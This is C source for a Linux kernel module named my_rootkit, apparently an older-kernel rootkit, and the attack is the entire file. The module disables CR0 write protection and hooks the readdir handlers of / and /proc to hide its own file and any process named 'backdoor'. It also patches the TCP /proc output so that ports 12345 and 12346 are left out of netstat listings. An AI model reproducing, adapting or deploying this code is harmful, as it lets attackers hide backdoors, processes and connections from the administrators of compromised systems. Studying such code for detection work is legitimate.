#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>

#include <linux/sched.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/mount.h>
#include <linux/spinlock.h> //spinlock_t

#include <linux/slab.h> //kmalloc kfree
#include <linux/list.h>
#include <linux/proc_fs.h> //PROC_ROOT_INO
#include <net/tcp.h>		//hide netstat
#include "my_rootkit.h"

#include <linux/version.h>


void setback_cr0(unsigned int val)
{
    asm volatile("movl %%eax, %%cr0"
               :
               : "a"(val)
               );
}
 
unsigned int clear_cr0_save(void)
{
	unsigned int cr0 = 0;
	unsigned int ret;
	__asm__ __volatile__ ("movl %%cr0, %%eax":"=a"(cr0));
	ret = cr0;

	cr0 &= 0xfffeffff;
	asm volatile ("movl %%eax, %%cr0":: "a"(cr0));
	return ret;
}
//hide files and processes
typedef int (*readdir_t)(struct file *, void *, filldir_t);
struct hide_file {
	char *name;
	struct list_head list;
};

static void k_hide_file(struct list_head *root, char *name)

{
	struct hide_file *hf = NULL;

	if (NULL==root || NULL==name) return;

	hf = kmalloc(sizeof(struct hide_file), GFP_KERNEL);
	if (!hf) return;

	hf->name = name;
	INIT_LIST_HEAD(&hf->list);
	list_add(&hf->list, root);
}
static void k_unhide_file(struct list_head *root, char *name)
{
	struct hide_file *hf = NULL;

	if (NULL==root || NULL==name) return;

	list_for_each_entry(hf, root, list) {
		if (!strcmp(name, hf->name)) {
			list_del(&hf->list);
			hf->name = NULL;
			kfree(hf);
			break;
		}
	}
}
static void k_free_list(struct list_head *root)
{
	struct hide_file *hf = NULL, *n = NULL;

	if (NULL == root) return;

	list_for_each_entry_safe(hf, n, root, list) {
		if (NULL != hf) {
			list_del(&hf->list);
			hf->name = NULL;
			kfree(hf);
		}
	}
}
//hide files
LIST_HEAD(hide_files);
char *root_fs = "/";    
struct super_block *root_sb[1024];
readdir_t orig_root_readdir = NULL;
filldir_t orig_root_filldir = NULL;

static int hack_root_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	struct hide_file *hf = NULL;
	int r = 0;
	
	if (!root_sb[current->pid%1024]) return 0;

	//hide files
	if (orig_root_filldir) {
		if (name) {
			list_for_each_entry(hf, &hide_files, list) {
				if (!strcmp(hf->name, name)) {
					printk(KERN_INFO "successfully hide %s\n", name);
					return 0;
				}
			}
		}

		r = orig_root_filldir(buf, name, nlen, off, ino, x);
	}
	return r;
}
static int hack_root_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	if (!fp || !fp->f_vfsmnt || !fp->f_vfsmnt->mnt_sb || !buf || !filldir || !orig_root_readdir)
		return 0;

	orig_root_filldir = filldir;
	root_sb[current->pid%1024] = fp->f_vfsmnt->mnt_sb;
	my_rootkit_debug("Here in root readdir\n");
	r = orig_root_readdir(fp, buf, (filldir_t)hack_root_filldir);

	return r;
}
//hide processes
LIST_HEAD(hide_processes);
char *proc_fs = "/proc";
readdir_t orig_proc_readdir = NULL;
filldir_t orig_proc_filldir = NULL;
spinlock_t proc_filldir_lock;

static int myatoi(char *str)
{
    int res = 0, mul = 1;
    char *ptr = NULL;

    for (ptr = str + strlen(str) - 1; ptr >= str; ptr--)
    {
        if (*ptr < '0' || *ptr > '9')
            return (-1);
        res += (*ptr - '0') * mul;
        mul *= 10;
    }
    return (res);
}
static struct task_struct* get_task(pid_t pid)
{
    struct task_struct *p = get_current(),*entry=NULL;
    list_for_each_entry(entry,&(p->tasks),tasks)
    {
        if(entry->pid == pid)
        {
            //printk(KERN_DEBUG "pid found=%d\n",entry->pid);
            return entry;
        }
    }
    return NULL;
}
static char* get_name(struct task_struct *p, char *buf)
{
    int i;
    char *name = NULL;
	unsigned char c;

	if (NULL == p || NULL == buf) return NULL;

    name = p->comm;
    i = sizeof(p->comm);
    do {
		c = *name;
        name++;  i--;
        *buf = c;
        if (!c) break;
        if (c == '\\') {
            buf[1] = c;
            buf += 2;
            continue;
        }
        if (c == '\n')
        {
            buf[0] = '\\';
            buf[1] = 'n';
            buf += 2;
            continue;
        }
        buf++;
    } while (i);
    *buf = '\n';
    return buf + 1;
}
static int hack_proc_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	struct hide_file *hf = NULL;
	int r = 0;
	pid_t pid = 0;
	char *str = (char*)name;
	char process_name[TASK_COMM_LEN] = "0";
	struct task_struct *task = NULL;

	my_rootkit_debug("name=%s\n", name);

	pid = myatoi((char*)str);
	if (-1 != pid) {
		task = get_task(pid);
		get_name(task, process_name);
	}
	my_rootkit_debug("process_name: %s\n", process_name);
	//hide processes
	if (orig_proc_filldir) {
		if (name) {
			list_for_each_entry(hf, &hide_processes, list) {
				if (strstr(process_name, hf->name)) {
					printk(KERN_INFO "successfully hide %s\n", name);
					return 0;
				}
			}
		}

		r = orig_proc_filldir(buf, name, nlen, off, ino, x);
	}
	return r;
}
static int hack_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;
	//struct kstat fbuf;

	spin_lock(&proc_filldir_lock);
	orig_proc_filldir = filldir;
	my_rootkit_debug("Here in proc readdir\n");
	//vfs_getattr(fp->f_path.mnt,fp->f_path.dentry,&fbuf);
	//my_rootkit_debug("ino:%d, proc:%d,major:%d,minor:%d\n", fbuf.ino, PROC_ROOT_INO, MAJOR(fbuf.dev), MINOR(fbuf.dev)); 
	//if(fbuf.ino == PROC_ROOT_INO && !MAJOR(fbuf.dev) && MINOR(fbuf.dev) == 3) {
	//	my_rootkit_debug("This is /proc file\n");
	//}
	r = orig_proc_readdir(fp, buf, (filldir_t)hack_proc_filldir);
	spin_unlock(&proc_filldir_lock);
	return r;
}
//hide netstat
#define MY_TMPSZ 150 //tcp_ipv4.c line 2497
typedef int(*TCP4_SEQ_SHOW)(struct seq_file*,void*);
TCP4_SEQ_SHOW orig_tcp4_seq_show = NULL;
static int g_hide_ports[] = {12345, 12346, 0};

static struct proc_dir_entry* find_proc_tcp(void)
{
	struct proc_dir_entry *p = NULL;
	if (NULL==init_net.proc_net || NULL==init_net.proc_net->subdir) {
		my_rootkit_debug("Failed to find tcp from /proc\n");
		return NULL;
	}
	p = init_net.proc_net->subdir;
	//my_rootkit_debug("/proc/net/%s\n", p->name);
	while (p && strcmp(p->name,"tcp")) {
		//my_rootkit_debug("/proc/net/%s\n", p->name);
		p = p->next;
	}
	return p;
}
char* strnstr(const char *src, const char *needle, size_t n)
{
	char *s = strstr(src, needle);
	if (NULL == s) return NULL;
	if (s-src+strlen(needle) <= n)
		return s;
	else return NULL;
}
int my_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int i = 0, r = 0;
	char port[12];
	char *s = NULL;

	r = orig_tcp4_seq_show(seq, v);
	for (i = 0; g_hide_ports[i]; i++) {
		sprintf(port, ":%04X", g_hide_ports[i]);
		//my_rootkit_debug("\n\n++++++++count=%d port=%s\n",seq->count,port);
		//my_rootkit_debug("========one msg:\n%s\n",seq->buf+seq->count-MY_TMPSZ);
		s = strnstr(seq->buf+seq->count-MY_TMPSZ, port, MY_TMPSZ);
		if (s) {
			//my_rootkit_debug("=========Find dist=%d\n",s-(seq->buf+seq->count-MY_TMPSZ));
			//my_rootkit_debug("buf:%s\n", seq->buf);
			seq->count -= MY_TMPSZ;
			break;
		}
		else {
			//my_rootkit_debug("=========Not Find\n");
			//my_rootkit_debug("buf:%s\n", seq->buf);
		}
	}

	return r;
}
static int hack_tcp4_seq_show(TCP4_SEQ_SHOW *old_func, TCP4_SEQ_SHOW new_func)
{
	struct proc_dir_entry *pde = NULL;
	struct tcp_seq_afinfo *t_afinfo = NULL;
	const char *err = "Failed to hack tcp4_seq_show!";
	
	pde = find_proc_tcp();
	if (NULL == pde) {
       my_rootkit_debug("%s pde is NULL\n", err);
	   return -1;
	}
	t_afinfo = (struct tcp_seq_afinfo*)pde->data;
	if (NULL == t_afinfo) {
		my_rootkit_debug("%s t_afinfo is NULL\n", err);
		return -1;
	}
	if (NULL == t_afinfo->seq_ops.show) {
		my_rootkit_debug("%s orig_tcp4_seq_show is NULL\n", err);
		return -1;
	}
	if (NULL != old_func) {
		*old_func = t_afinfo->seq_ops.show;
	}
	if (NULL == new_func) {
		my_rootkit_debug("%s new tcp4_seq_show is NULL\n", err);
		return -1;
	}
	t_afinfo->seq_ops.show = new_func;
	return 0;
}

static int hack_vfs(const char *path, readdir_t *orig_readdir, readdir_t new_readdir)
{
	struct file *filep = NULL;
	my_rootkit_debug("hack_vfs: begin\n");
	filep = filp_open(path, O_RDONLY, 0);	
	if (IS_ERR(filep)) {
		my_rootkit_debug("Failed to open file %s\n", path);
		return -1;
	}
	my_rootkit_debug("hack_vfs: filep_open ok\n");
	
	if (orig_readdir) {
		*orig_readdir = ((struct file_operations *)(filep->f_op))->readdir;
	}
	((struct file_operations *)(filep->f_op))->readdir = new_readdir;
	my_rootkit_debug("hack_vfs: change f_op ok\n");
	
	filp_close(filep, 0);
	my_rootkit_debug("hack_vfs: end\n");
	return 0;
}
static int unhack_vfs(const char *path, readdir_t orig_readdir)
{
	struct file *filep = NULL;
	my_rootkit_debug("unhack_vfs: begin\n");
	filep = filp_open(path, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
		return -1;
	}
	my_rootkit_debug("unhack_vfs: filep_open ok\n");
	
	if (orig_readdir)
		((struct file_operations *)(filep->f_op))->readdir = orig_readdir;
	my_rootkit_debug("unhack_vfs: change f_op ok\n");

	filp_close(filep, 0);
	my_rootkit_debug("unhack_vfs: end\n");
	return 0;
}
//Initialize the module
static int __init my_rootkit_init(void)
{
	unsigned int cr0;
	
	my_rootkit_debug("Begin in init_module\n");
	
	k_hide_file(&hide_files, "my_rootkit");
	k_hide_file(&hide_processes, "backdoor");

	cr0 = clear_cr0_save();
	if (-1 == hack_vfs(root_fs, &orig_root_readdir, hack_root_readdir))
		my_rootkit_debug("Failed to hack_vfs\n");	
	spin_lock_init(&proc_filldir_lock);
	if (-1 == hack_vfs(proc_fs, &orig_proc_readdir, hack_proc_readdir))
		my_rootkit_debug("Failed to hack_vfs\n");	
	//hide net state
	hack_tcp4_seq_show(&orig_tcp4_seq_show, my_tcp4_seq_show);	
	setback_cr0(cr0);
	
	my_rootkit_debug("End in init_module\n");
	return 0;
}
//Exit the module
static void __exit my_rootkit_exit(void)
{
	unsigned int cr0;
	my_rootkit_debug("Begin in cleanup_module\n");

	cr0 = clear_cr0_save();
	if (-1 == unhack_vfs(root_fs, orig_root_readdir))
		my_rootkit_debug("Failed to unhack_vfs\n");
	if (-1 == unhack_vfs(proc_fs, orig_proc_readdir))
		my_rootkit_debug("Failed to unhack_vfs\n");
	if (orig_tcp4_seq_show)
		hack_tcp4_seq_show(NULL, orig_tcp4_seq_show);
	setback_cr0(cr0);
	k_free_list(&hide_files);
	k_free_list(&hide_processes);
	my_rootkit_debug("End in cleanup_module\n");
}
MODULE_AUTHOR("ChHuWaLi");
MODULE_LICENSE("Dual BSD/GPL");
module_init(my_rootkit_init);
module_exit(my_rootkit_exit);
